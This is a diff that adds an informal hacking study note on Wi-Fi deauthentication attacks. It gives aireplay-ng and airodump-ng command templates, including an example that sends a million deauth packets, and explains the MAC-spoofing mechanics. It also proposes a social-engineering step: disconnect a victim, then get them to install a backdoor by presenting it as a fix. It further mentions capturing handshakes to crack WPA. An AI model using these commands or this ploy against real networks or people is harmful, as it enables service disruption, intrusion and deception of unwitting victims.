@@ -1,0 +1,39 @@
+DEAUTH ATTCK
+============
+
+- disconnect any clients from any network 
+a. works on encrypted networks 
+b. no need to know the network key
+c. no need to connect to the network 
+
+use:
+> aireplay-ng --deauth [deauth packets] -a [network mac] -c [target mac] [interface]
+
+what happens:
+a. we pretend to be the client (by changing our mac address as the client's)
+b. tell the router that i wanna disconnect from you 
+c. we pretend to be the router (by changing our mac address as the router's)
+d. tell the client that you've requested to be disconnected so i'll 
+disconnect form you 
+
+example:
+> aireplay-ng --deauth 1000000 -a [router mac] -c [target mac] [interface]
+
+note:
+even if we disconnect the client, the client might connect to another network 
+other than the one that we disconnect it from 
+
+what you wanna do:
+> airodump-ng --bssid [router mac] --channel [channel] [interface]
+
+in another linux terminal:
+> aireplay-ng --deauth [deauth packets] -a [network mac] -c [target mac] [interface]
+
+social engineering idea:
+do this then you should ask the person to install a backdoor 
+that you say it'll fix their issues 
+
+note:
+you could also capture the handshake 
+this is gonna be able to be used to crack wpa
+
